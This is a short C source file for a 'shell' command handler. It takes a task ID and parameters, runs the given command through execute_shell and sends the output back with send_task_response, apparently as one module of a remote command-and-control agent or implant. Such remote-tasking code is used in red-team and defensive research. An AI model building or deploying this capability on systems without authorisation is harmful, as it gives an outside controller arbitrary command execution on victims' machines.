#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef INCLUDE_CMD_SHELL

void command_shell(char *task_id, char *params) {
  char arguments[1024] = {0};

  if (params[0] == '{') {
    extract_json_string(params, "arguments", arguments, sizeof(arguments));
    if (strlen(arguments) == 0) {
      extract_json_string(params, "command", arguments, sizeof(arguments));
    }
  } else {
    strncpy(arguments, params, sizeof(arguments) - 1);
  }

  printf("Executing shell: %s\n", arguments);
  char *output = execute_shell(arguments);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
